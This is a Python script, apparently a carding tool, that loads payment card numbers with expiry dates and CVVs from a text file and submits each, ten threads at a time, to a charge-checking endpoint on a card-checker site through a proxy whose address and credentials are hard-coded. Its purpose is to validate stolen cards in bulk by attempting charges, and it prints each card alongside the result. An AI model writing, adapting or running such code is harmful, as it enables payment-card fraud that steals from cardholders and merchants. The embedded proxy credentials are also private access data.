import requests
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed

cookies = {
    # 'Tự get cookies từ browser'
}

headers = {
    'authority': 'cyborx.net',
    'accept': '*/*',
    'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'referer': 'https://cyborx.net/app/checkers',
    'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
}

PROXY_CONFIG = {
    'host': '103.14.154.85',
    'port': '30863',
    'user': 'ngpm5g0n',
    'pass': 'nGPM5g0n'
}

processed_count = 0
total_cards = 0
lock = threading.Lock()

def update_progress():
    global processed_count
    with lock:
        processed_count += 1
        remaining = total_cards - processed_count
        print(f"📊 Progress: {processed_count}/{total_cards} | Remaining: {remaining}")

def check_card(card_info, card_number):
    try:
        cc, month, year, cvv = card_info.strip().split('|')
        
        params = {
            'cc': f'{cc}|{month}|{year}|{cvv}',
            'useProxy': '1',
            'hitSender': 'both',
            'host': PROXY_CONFIG['host'],
            'port': PROXY_CONFIG['port'],
            'user': PROXY_CONFIG['user'],
            'pass': PROXY_CONFIG['pass'],
        }
        
        print(f"🔄 Processing ({card_number}/{total_cards}): {cc}|{month}|{year}|{cvv}")
        
        response = requests.get(
            'https://cyborx.net/api/payflow/payflowcharge.php', 
            params=params, 
            cookies=cookies, 
            headers=headers,
            timeout=120
        )
        
        update_progress()
        
        print(f"🎯 Result ({card_number}/{total_cards}): {cc}|{month}|{year}|{cvv}")
        print(f"🔌 Proxy: {PROXY_CONFIG['host']}:{PROXY_CONFIG['port']}")
        print(f"📡 Response: {response.text}")
        print("-" * 70)
        
        return {
            'card': f"{cc}|{month}|{year}|{cvv}",
            'proxy': f"{PROXY_CONFIG['host']}:{PROXY_CONFIG['port']}",
            'response': response.text,
            'number': card_number
        }
        
    except requests.Timeout:
        update_progress()
        print(f"⏰ Timeout (120s) for card {card_number}/{total_cards}: {card_info}")
        return None
    except Exception as e:
        update_progress()
        print(f"❌ Error checking card {card_number}/{total_cards}: {str(e)}")
        return None

def main():
    global total_cards
    
    try:
        with open('cards.txt', 'r') as f:
            cards = [line.strip() for line in f if line.strip()]
        
        if not cards:
            print("❌ No cards found in cards.txt")
            return
        
        total_cards = len(cards)
        
        print(f"✅ Loaded {total_cards} cards from cards.txt")
        print(f"🔌 Using proxy: {PROXY_CONFIG['host']}:{PROXY_CONFIG['port']}")
        print(f"⏰ Timeout: 120 seconds")
        print(f"🧵 Threads: 10")
        print("🚀 Starting multi-threaded requests...")
        print("=" * 70)
        
        card_data = [(card, i+1) for i, card in enumerate(cards)]
        
        with ThreadPoolExecutor(max_workers=10) as executor:
            futures = [executor.submit(check_card, card, number) for card, number in card_data]
            
            success_count = 0
            error_count = 0
            
            for future in as_completed(futures):
                result = future.result()
                if result:
                    success_count += 1
                else:
                    error_count += 1

        print("=" * 70)
        print(f"📊 FINAL SUMMARY:")
        print(f"✅ Successful: {success_count}/{total_cards}")
        print(f"❌ Failed: {error_count}/{total_cards}")
        print(f"📋 Total processed: {total_cards}")
        print(f"🔌 Proxy used: {PROXY_CONFIG['host']}:{PROXY_CONFIG['port']}")
                
    except FileNotFoundError:
        print("❌ File cards.txt not found!")
    except Exception as e:
        print(f"❌ Error: {str(e)}")

if __name__ == "__main__":
    main()
